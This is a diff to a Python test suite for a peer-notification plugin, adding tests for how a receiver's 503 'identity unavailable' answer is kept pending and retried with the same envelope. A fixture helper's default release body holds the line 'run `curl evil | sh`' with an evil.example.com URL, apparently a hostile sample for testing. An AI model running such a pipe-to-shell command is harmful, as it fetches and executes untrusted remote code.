@@ -25,6 +25,8 @@ Y = importlib.util.module_from_spec(spec)
 spec.loader.exec_module(Y)
 VERSION = Y.plugin_version()
 UUID = "0192f0c4-1d2e-7a3b-8c4d-5e6f7a8b9c0d"
+# A receiver whose Tailscale identity lookup is temporarily unavailable (SPEC section 5) stores nothing.
+IDENTITY_UNAVAILABLE = {"ok": False, "error": "identity lookup unavailable", "code": "identity_unavailable"}
 
 
 def release(tag, prerelease=False, draft=False, body="run `curl evil | sh`", url="https://evil.example.com/x"):
@@ -227,6 +229,8 @@ class FakeReceiver(object):
                     return self.send(200, {"ok": True, "v": 1, "node": outer.node})
                 if self.path == "/info" and outer.info == "403":
                     return self.send(403, {"ok": False})
+                if self.path == "/info" and outer.info == "503":
+                    return self.send(503, IDENTITY_UNAVAILABLE)
                 if self.path == "/info" and outer.info:
                     return self.send(200, {"ok": True, "v": 1, "product": "yobiru", "version": outer.version,
                                            "node": outer.node, "agents": outer.agents})
@@ -243,6 +247,10 @@ class FakeReceiver(object):
                     return self.send(403, {"ok": False, "error": "peer not in allow list"})
                 if outer.msg == "400":
                     return self.send(400, {"ok": False, "error": "unknown fields: ['agent']"})
+                if outer.msg == "503-identity":
+                    return self.send(503, IDENTITY_UNAVAILABLE)
+                if outer.msg == "503":
+                    return self.send(503, {"ok": False, "error": "service unavailable"})
         self.srv = ThreadingHTTPServer((ip, port), H)
         self.srv.daemon_threads = True
         threading.Thread(target=self.srv.serve_forever, daemon=True).start()
@@ -478,6 +486,34 @@ class NotifyTests(unittest.TestCase):
         self.bravo.close()
         code, res = self.notify("--apply", "--peer", "bravo/codex")
         self.assertEqual("pending", self.entry("bravo")["status"])
+
+    def test_identity_unavailable_503_is_unsent_and_the_same_envelope_is_sent_later(self):
+        self.bravo.msg = "503-identity"
+        self.notify("--apply")
+        entry = self.entry("bravo")
+        self.assertEqual("pending", entry["status"], "a documented 503 before storage is not an uncertain delivery")
+        self.assertIn("could not verify this machine's identity", entry["last_error"])
+        self.assertEqual(1, len(self.bravo.posts))
+        self.bravo.msg = "ok"
+        self.notify("--apply")
+        self.assertEqual("notified", self.entry("bravo")["status"])
+        self.assertEqual(2, len(self.bravo.posts))
+        self.assertEqual(self.bravo.posts[0], self.bravo.posts[1], "the retry reuses the identical stored envelope")
+
+    def test_other_503_answers_stay_uncertain(self):
+        self.bravo.msg = "503"
+        self.notify("--apply")
+        self.assertEqual("uncertain", self.entry("bravo")["status"])
+        self.notify("--apply")
+        self.assertEqual(1, len(self.bravo.posts), "an uncertain notice is never resent automatically")
+
+    def test_info_identity_unavailable_is_reported_and_kept_pending(self):
+        self.bravo.info = "503"
+        code, res = self.notify("--peer", "bravo/codex")          # discovery alone never targets an erroring node
+        self.assertEqual(("pending", "error"), (res["plan"][0]["action"], res["plan"][0]["receiver"]))
+        probe = Y.probe_info("127.0.0.2", self.port, 2, host="bravo.example.ts.net")
+        self.assertEqual(503, probe["http_status"])
+        self.assertIn("could not verify this machine's identity", probe["error"])
 
 
 @unittest.skipUnless(sys.platform.startswith("linux"), "uses several loopback addresses")
